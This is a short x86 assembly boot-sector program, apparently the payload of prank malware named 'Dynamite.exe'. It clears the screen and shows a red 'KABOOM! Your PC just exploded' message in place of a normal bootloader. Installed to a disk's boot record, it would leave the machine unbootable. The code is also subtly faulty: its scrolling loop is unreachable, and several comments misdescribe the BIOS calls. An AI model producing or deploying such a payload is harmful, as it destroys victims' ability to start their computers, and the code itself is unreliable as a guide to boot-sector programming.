BITS    16
ORG     0x7c00
jmp start

start:
    call clear_screen
    mov ax, cs
    mov ds, ax
    mov si, msg
    mov cx, 0   ; Counter for horizontal scrolling

    call print

scroll:
    call scroll_screen
    inc cx      ; Increment the horizontal scrolling counter
    cmp cx, 40  ; Check if reached the desired scrolling width
    jne continue_scroll
    mov cx, 0   ; Reset the scrolling counter

continue_scroll:
    jmp scroll

print:
    push ax
    cld
next:
    mov al, [si]
    cmp al, 0
    je done
    call printchar
    inc si
    jmp next

done:
    pop ax
    jmp $

printchar:
    mov ah, 0x0e
    mov bh, 0x00 ; Set the background to black (0x00)
    mov bl, 0x04 ; Set the text color to red (0x04)
    int 0x10
    ret

clear_screen:
    mov ah, 0x06
    mov al, 0x00
    mov bh, 0x07 ; Use the attribute 0x07 (light gray on black)
    mov cx, 0x0000
    mov dx, 0x184f
    int 0x10
    ret

scroll_screen:
    mov ah, 0x07
    mov al, 0x00
    mov bh, 0x00 ; Use the attribute 0x00 (black on black, effectively hiding the text)
    mov cx, 0x0001 ; Scroll 1 column to the left
    mov dx, 0x184f
    int 0x10
    ret

msg:    db  "KABOOM! Your PC just exploded due to Dynamite.exe!", 0
times 510 - ($-$$) db 0
dw  0xaa55
